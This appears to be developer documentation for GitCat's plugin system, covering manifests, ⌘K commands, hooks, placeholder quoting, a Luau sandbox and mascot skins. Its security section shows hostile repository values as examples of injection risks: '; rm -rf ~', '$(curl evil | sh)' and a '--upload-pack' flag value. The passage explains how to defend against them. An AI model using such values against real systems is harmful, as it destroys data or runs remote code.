---
description: Author a GitCat plugin — a declarative plugin.json that contributes ⌘K commands and lifecycle hooks backed by your own external commands.
---

# Writing a plugin

A GitCat plugin is a small, **declarative** manifest — a single `plugin.json` file. It doesn't ship code that runs inside GitCat; it contributes two things:

- **Commands** — actions that show up in the ⌘K command palette and run an external command you specify.
- **Hooks** — external commands GitCat runs automatically when something happens (a repo opens, a commit is created, an undo runs, …).

GitCat provides a plugin system with declarative manifests, an external-process executor, and a sandboxed Luau runtime.
Like the rest of GitCat, plugins are AI-agnostic: GitCat itself contacts no AI service and no network. If you want a plugin that calls an AI, *you* write the `run` line that shells out to your own tool — GitCat only runs it.

## The manifest: `plugin.json`

A manifest is a small JSON document. Here's a complete, annotated example:

```json
{
  "id": "lint-and-review",
  "name": "Lint & Review",
  "version": "1.0.0",
  "description": "Lint the working tree and hand a commit to an external review tool.",
  "enabled": true,
  "commands": [
    {
      "id": "lint",
      "label": "Lint the working tree",
      "run": "npm run lint",
      "context": "repo",
      "placement": "palette"
    },
    {
      "id": "review-commit",
      "label": "Review this commit",
      "run": "my-review-tool --sha {sha} --repo {repo}",
      "context": "commit",
      "placement": "both"
    }
  ],
  "hooks": [
    {
      "event": "commit-created",
      "run": "printf '::gitcat.tama ok Nice commit!'"
    }
  ]
}
```

### Top-level fields

| Field | Required | Type | Notes |
| --- | --- | --- | --- |
| `id` | ✅ | string | Stable, unique identifier. Must match `^[a-z0-9][a-z0-9-]*$` — start with a lowercase letter or digit, then lowercase letters, digits, and `-` only. No uppercase, spaces, underscores, or dots. Used as the enable/remove key. Installing a second plugin with the same `id` is rejected. |
| `name` | ✅ | string | Human-readable display name (shown in Settings and as the ⌘K hint). Must be non-empty. |
| `version` | ✅ | string | Any non-empty string (e.g. `"1.0.0"`). Not parsed or compared — it's just for your reference. |
| `description` | — | string | Optional one-liner. |
| `enabled` | — | boolean | Defaults to `true` when omitted — a freshly installed plugin is active until you disable it. |
| `commands` | — | array | Zero or more [commands](#commands). Defaults to `[]`. |
| `hooks` | — | array | Zero or more [hooks](#hooks). Defaults to `[]`. |
| `tama` | — | object | Optional [Tama skin](#tama-skins) — an alternate look and voice for the mascot (poses, a greeting, a voice pitch). |
| `lua` | — | string | Optional path (relative to the plugin folder) to a main Luau script — required only if any command/hook uses a `handler`. See [Scripting with Luau](#scripting-with-luau). |

A manifest must be a regular file no larger than **256 KB** (a `plugin.json` is tiny by design).

## Commands

Each entry in `commands[]` contributes one invocable action.

| Field | Required | Notes |
| --- | --- | --- |
| `id` | ✅ | Unique within the plugin. Combined with the plugin `id` to address the command. |
| `label` | ✅ | The text shown in ⌘K. |
| `run` | ✳️ | The external command [template](#placeholders). **Declare exactly one of `run` or `handler`.** |
| `handler` | ✳️ | The name of a [Luau handler](#scripting-with-luau) function instead of a shell `run`. Requires the plugin to declare a top-level `lua` script. **Declare exactly one of `run` or `handler`.** |
| `context` | — | What selection the command needs. Default `"none"`. |
| `placement` | — | Where the command surfaces. Default `"palette"`. |
| `mutates` | — | Set `true` if the command changes the repository. Default `false`. See [Mutating actions & Undo](#mutating-actions-undo). |

### `context`

`context` declares what the command operates on, which determines which [placeholders](#placeholders) get filled in:

| Value | Meaning |
| --- | --- |
| `none` *(default)* | Always applicable; needs no selection. |
| `commit` | Needs a selected commit (fills `{sha}`). |
| `file` | Needs a selected file. |
| `repo` | Repo-scoped — needs only the open repository. |

> **What's populated today.** The built-in ⌘K invocation always fills `{repo}`, and fills `{sha}` for a `commit`-context command. The other tokens are recognized by the expander and reserved for richer selection contexts, but are not yet populated from the palette, so they currently expand to an empty string. Write your templates against the full grammar; just know that `file`/`files`/`diff`/`branch`/`ref` come from the UI later.

### `placement`

| Value | Meaning |
| --- | --- |
| `palette` *(default)* | Only in the ⌘K command palette. |
| `menu` | Only in the relevant native context menu. |
| `both` | Both the palette and the context menu. |

> **The native menu isn't wired yet.** Right now commands surface **only in ⌘K**. A `palette` or `both` command appears there today; a `menu`-only command won't appear anywhere until the context-menu integration lands. If you want your command usable now, use `palette` (or `both`).

Installed commands show up in ⌘K **live** — right after you install, enable, or disable a plugin, with no need to reopen the palette.

## Placeholders

A `run` string is a template. Before running it, GitCat substitutes `{...}` tokens with values from the current context.

| Token | Expands to |
| --- | --- |
| `{repo}` | The repository's path. **Also the working directory** the command runs in. |
| `{sha}` | The selected commit's id. |
| `{file}` | A single selected file path. |
| `{files}` | Several selected file paths, each quoted, space-joined. |
| `{diff}` | Diff text. |
| `{branch}` | A branch name. |
| `{ref}` | A full ref / tag / symbolic ref. |

Rules the expander follows:

- **Every substituted value is POSIX single-quoted** so the shell treats it as one inert literal argument — it can't word-split, glob, expand a variable, run a command substitution, or break out of its argument.
- **The grammar is narrow**: a token is `{` + one-or-more **lowercase ASCII letters** + `}`. Anything else is left verbatim, so your own shell syntax survives untouched — `${HOME}` (uppercase), `${1}` (digit), `awk '{print $1}'` (space), and `{}` are all copied through, not treated as tokens.
- **Unknown tokens expand to nothing.** An unrecognized `{name}`, or a token whose value is absent, becomes an empty string.
- **Single pass, no re-expansion.** A value that itself contains `{repo}` or `{sha}` text (e.g. inside a diff) is never re-scanned, so untrusted content can't smuggle in a second placeholder.

### Values are untrusted — guard against flag injection

Placeholder values come from whatever repository is open, which a malicious project controls freely: a branch literally named `; rm -rf ~`, a file named `$(curl evil | sh)`, diff text full of backticks. Single-quoting neutralizes all of that as *shell* injection — but it does **not** change argument boundaries. A value that starts with `-` (a branch named `--upload-pack=…`, a ref `-n`) is still handed to your tool as an **option**.

**Put a `--` end-of-options separator before any untrusted placeholder:**

```jsonc
// good — the branch name can never be read as a flag
"run": "git checkout -- {branch}"
```

### The command runs in the repo

The expanded command runs with the **repository as its working directory** (the same path `{repo}` expands to). A command invoked with **no repository open is refused** — there's nowhere sensible to run it. Commands are run through the platform shell (`sh -c` on macOS/Linux, `cmd /C` on Windows), so a `run` line can be a full command line with arguments and pipes. There's a **120-second timeout**; stdout is captured (ANSI escapes stripped), and a non-zero exit is reported as a normal outcome, not a hard error.

### Windows caveat

The shell quoting above is POSIX single-quoting, which `cmd.exe` does **not** interpret the same way. So on Windows GitCat **fails closed**: before running, it refuses the command if any substituted value contains a character `cmd.exe` would act on regardless of quoting — `& | < > ^ % ! "` or a carriage return / newline. This blocks injection through a hostile branch/ref/file name, at the cost of refusing some legitimate values. In particular **`{diff}` is almost always refused on Windows** (diffs routinely contain those characters).

Practically: **write `run` lines for a POSIX shell.** Windows plugins should target Git-Bash or WSL on `PATH` rather than raw `cmd`.

## Hooks

Each entry in `hooks[]` runs a `run` command (same template grammar and execution as a command) — or, instead, a Luau `handler` (see [Scripting with Luau](#scripting-with-luau)) — when a lifecycle event fires. Just like a command, a hook must declare **exactly one** of `run` or `handler`.

```json
"hooks": [
  { "event": "repo-opened", "run": "my-tool sync --repo {repo}" }
]
```

| `event` | Fires when… |
| --- | --- |
| `repo-opened` | Any time a repository is opened. |
| `repo-switched` | A repository is opened while moving from a *different* repo. |
| `pre-mutation` | GitCat is about to perform a history-changing or destructive operation. |
| `commit-created` | You create a commit through GitCat's commit UI. |
| `undo` | A global Undo is performed. |
| `post-mutation` | *Declared but **not fired yet*** — see below. |

Key facts about hooks:

- **`post-mutation` is not wired yet.** It's accepted in the schema so manifests are forward-compatible, but GitCat has no single post-mutation chokepoint to fire it from, so a `post-mutation` hook currently never runs.
- **Hooks are fire-and-forget observers.** GitCat does not wait for a hook before proceeding, and a hook **cannot veto or block** an operation. Even a slow `pre-mutation` hook can't gate the mutation it observes.
- **Only enabled plugins' hooks run.** A hook whose command fails to even launch is skipped so it can't stall the event or the other hooks.
- Hooks receive **only `{repo}`** in their context today.
- A hook can set `"mutates": true` (same as a command) if it changes the repo — see [Mutating actions & Undo](#mutating-actions-undo).
- Hooks run on a shorter **30-second timeout** than commands (they're background observers).
- No infinite loops: a hook that itself runs `git commit` is an external shell call and does **not** re-fire GitCat's own lifecycle events.

## Tama reactions

A command or hook can nudge Tama's mood straight from its **stdout**, without any special API. Print a line anywhere in stdout:

```
::gitcat.tama <reaction> <message>
```

`<reaction>` must be one of a fixed, closed **safe allowlist**:

| Reaction | Tama's pose | Meaning |
| --- | --- | --- |
| `info` | hint | "here's something to know" |
| `busy` | thinking | "I'm working on it" |
| `ok` | celebrate | "that went well" |
| `problem` | confused | "that didn't go well" |

The `<message>` is trimmed and capped at ~160 characters. The directive line itself is stripped from the output Tama shows — so `printf '::gitcat.tama ok Done!'` makes Tama celebrate and say "Done!" without echoing the raw control line. If a command prints several directives, the **last valid one wins**. With no directive at all, GitCat surfaces the command's output as usual.

**A plugin can never spoof a safety warning.** The four tokens above are the *only* path from plugin stdout to a Tama pose, and every target is benign or informational. GitCat's safety-critical poses (the alarmed "danger" face, the rewrite/undo warnings) are reachable **only** when GitCat itself flagged a destructive action — no `<reaction>` maps to them. Any other token (`danger`, `warn`, `undo`, or arbitrary garbage) is silently **ignored**: it changes nothing and can't even win the "last valid line" race against a real `ok`.

## Scripting with Luau {#scripting-with-luau}

A `run` string is a single shell command. When you need real logic — branch on
`git` output, loop over files, build a message — a command or hook can instead
run a **handler function written in [Luau](https://luau.org)** (a fast, safe Lua
dialect) inside a locked-down sandbox. This is still AI-agnostic and offline:
the script's only reach outward is a `git()` function.
Tools ▶ **Plugins...** tab →
### The two manifest fields

- **`lua`** (top-level) — a path, relative to the plugin folder, to your main
  script (e.g. `"lua": "main.lua"`). The file must be a real `.lua` file inside
  the plugin folder (no `..`, no symlink escaping the folder), at most 256 KB.
- **`handler`** (on a command or hook) — the **name** of a function your script
  exports. A command/hook declares **exactly one** of `run` (shell) or `handler`
  (Luau); declaring both, or neither, is rejected at install. Any `handler`
  requires the plugin to declare a `lua` script.

```jsonc
{
  "id": "my-scripted-plugin",
  "name": "My Scripted Plugin",
  "version": "1.0.0",
  "lua": "main.lua",
  "commands": [
    { "id": "hello", "label": "Say hello", "handler": "hello", "context": "repo" }
  ]
}
```

### The script returns a table of handlers

Your main file **`return`s a table** mapping handler names to functions. Each
handler is called with a single **`ctx`** argument:

```lua
-- main.lua
local M = {}

function M.hello(ctx)
  local head = git({ "rev-parse", "--short", "HEAD" })
  if head.ok then
    local sha = (head.stdout:gsub("%s+$", ""))
    print("HEAD is at " .. sha)          -- captured as the command's output
    tama.react("ok", "Hello — HEAD is " .. sha)
    return "done at " .. sha              -- a returned string is appended too
  end
  tama.react("problem", "could not read HEAD")
end

return M                                  -- the command's `handler: "hello"` calls M.hello
```

### The host API — the entire outside-world surface

A handler sees exactly four things (nothing else — see [the sandbox](#the-luau-sandbox)):

| Name | What it is |
| --- | --- |
| `ctx` | A **read-only** table mirroring the [placeholders](#placeholders): `ctx.repo`, `ctx.sha`, `ctx.file`, `ctx.files` (an array), `ctx.diff`, `ctx.branch`, `ctx.ref`. Absent fields are `nil`. (Populated from the UI exactly like the shell tokens — today `ctx.repo` always, plus `ctx.sha` for a `commit`-context command.) Also passed as the handler's argument. |
| `git(args)` | Run `git` with `args` (an **array of strings**) in the repo — `git({ "log", "-1", "--format=%s" })`. Returns a table `{ stdout, stderr, code, ok }` (`ok` is `true` on a zero exit; `code` is the exit code, or `nil` if signal-killed). **No shell is involved**, so an arg is inert literal data — there is nothing to inject into, unlike the shell `run` path. |
| `tama.react(kind, msg)` | Nudge Tama's mood. `kind` must be one of `info`, `busy`, `ok`, `problem` (the same [safe allowlist](#tama-reactions) as the `::gitcat.tama` stdout protocol) — any other value is ignored. A script can **never** reach a safety-critical pose. |
| `print(...)` | Append to the command's captured output (there is no console). Arguments are `tostring`'d and tab-joined, like Lua's `print`. |

The command's output is everything `print`ed, plus any `tama.react` lines, plus
(if the handler returns a string) that string.

### The Luau sandbox {#the-luau-sandbox}

Handlers run in a fresh, isolated Luau VM built for **untrusted code**:

- **Only safe libraries** are loaded — `string`, `math`, `table`, and Luau's
  base library (`print`, `pairs`, `pcall`, `tostring`, …). There is **no `os`,
  no `io`, no network**, and **no `require` / `load` / `loadstring` / `dofile`**
  — a script cannot touch the filesystem, spawn processes (except through
  `git()`), open sockets, or load more code.
- **Hard limits**: a ~64 MB memory ceiling (an allocation past it aborts the
  script) and a wall-clock time budget of a few seconds (a runaway loop is
  killed). Either limit, any Lua compile/runtime error, or a missing/ill-typed
  handler surfaces as the command **failing** — GitCat reports the error.
- Each invocation gets a **fresh VM**; no state leaks between runs.

> The sandbox constrains what a script *can reach*, but `git()` can still read
> **and write** the repo — the same trust boundary as a shell `run`. Install a
> scripted plugin only if you'd run its code yourself.

### Mutating handlers must set `mutates`

Just like a shell command, a Luau handler that **changes the repository** (any
`git()` call that writes — `commit`, `reset`, `checkout`, `restore`, …) must set
**`"mutates": true`** on its command/hook. GitCat then takes a safety snapshot
before running it, so the change is covered by global **Undo** (and a mutating
command that can't be snapshotted is refused rather than run unprotected). GitCat
can't infer this from your script, so **always declare it** — a mutating handler
that omits `mutates` runs **outside** Undo. See
[Mutating actions & Undo](#mutating-actions-undo).

## Tama skins {#tama-skins}

A plugin can also ship an alternate **look and voice** for Tama by declaring a top-level `tama` object. This is purely declarative art and copy — a skin contributes no commands and no hooks, runs no process, and needs no open repository. It ships its own pose images (bring real character art; recolors of the default read as off), and once installed you pick it in **Settings → Tama → Skin**.

Apply a skin from **Settings → Tama → Skin**: the picker lists **Default (built-in)**, the built-in characters, and every enabled plugin that declares a `tama` field.

```jsonc
{
  "id": "my-character-skin",
  "name": "My Character",
  "version": "1.0.0",
  "tama": {
    "poses": {
      "hero": "poses/hero.webp",
      "curious": "poses/curious.webp"
      // …the remaining pose keys…
    },
    "voicePitch": 1.05,          // optional; omit for the default 1.0
    "copy": { "greeting": "Hi, I'm filling in for Tama today." } // optional
  }
}
```

| Field | Required | Type | Notes |
| --- | --- | --- | --- |
| `poses` | ✅ | object | Maps a built-in pose **key** to a **relative** image path inside the plugin folder. The eight keys are `hero`, `curious`, `confident`, `thinking`, `happy`, `alarm`, `shocked`, `sleep`. A skin may override **some or all** of them — any key it omits falls back to Tama's default painted portrait. Any other key is rejected at install time. Paths may not be absolute or contain `..`. |
| `voicePitch` | — | number | A multiplier applied to Tama's synthesized sound effects, so the character speaks higher (`> 1`) or lower (`< 1`). Omitted means **no change** (`1.0`). Must be finite; a finite out-of-range value is **clamped** to `[0.5, 2.0]` when the skin loads. |
| `copy` | — | object | Optional greeting/voice lines. GitCat surfaces one (preferring `applied` > `greeting` > `hero`, else the first) as a courtesy toast when the skin is applied, capped at ~160 chars. It can never reach a safety-critical pose — the same trust boundary as a `::gitcat.tama` reaction. |

## Installing & managing plugins

Plugins are installed from a local file — there's no registry or marketplace.

1. Open **Tools ▶ Plugins...**.
2. Click **Install plugin…** and pick the plugin's `plugin.json` file (open the plugin's folder and select its `plugin.json`).
3. The plugin appears in the list, enabled by default. Its commands are immediately available in ⌘K.

From the same tab you can:

- **Enable / disable** a plugin with its toggle (a disabled plugin's commands and hooks stop running immediately).
- **Remove** a plugin. This only drops it from GitCat's registry — your original `plugin.json` file on disk is untouched, so you can reinstall it later.

### Where the registry lives

Installed plugins are recorded in a single `plugins.json` file under GitCat's app config directory:

| Platform | Path |
| --- | --- |
| macOS | `~/Library/Application Support/com.jiucheng.gitcat/plugins.json` |
| Linux | `~/.config/com.jiucheng.gitcat/plugins.json` (or `$XDG_CONFIG_HOME/...`) |
| Windows | `%APPDATA%\com.jiucheng.gitcat\plugins.json` |

This file stores the *installed* manifests (GitCat copies them in at install time); it isn't meant to be hand-edited. If it's ever corrupted, GitCat renames it aside and starts fresh rather than refusing to launch.

## Security & trust {#security-trust}

A plugin's `run` string is a **user-authored external command that runs on your machine** — the same trust boundary as an external diff/merge tool `cmd`. Install a plugin only if you'd be comfortable running its commands yourself in a terminal. GitCat never evaluates the `run` string in-process, and it contacts no AI service or network on its own; whatever a plugin does lives entirely inside its own commands.

A few limits worth knowing while the plugin security model is still being built out:

- <a id="mutating-actions-undo"></a>**Mutating actions & Undo.** GitCat snapshots before its *own* mutations so global Undo can always restore them. A plugin command or hook that changes the repo (`git reset --hard`, `git checkout`, etc.) gets the same protection **when it declares `"mutates": true`**: GitCat takes a snapshot before running it, so the change is covered by Undo. A command declared this way that can't be snapshotted is **refused** rather than run unprotected. A mutating action that does **not** set `mutates` runs **outside** Undo (and takes no snapshot) — so **always set `"mutates": true` on anything that changes the repo.** GitCat can't infer it from your opaque `run` string.
- **Argument injection is your responsibility.** Quoting stops shell injection but not flag injection — use `--` before untrusted placeholders (see [above](#placeholders)).
- **The subprocess inherits GitCat's environment.** A plugin command can read GitCat's environment variables.

## Example plugins

Ready-to-read manifests live in [`examples/plugins/`](https://github.com/zangjiucheng/GitCat/tree/main/examples/plugins) in the repository — copy one, edit its `id`/`run` lines, and install it from **Tools → Plugins** to get started.
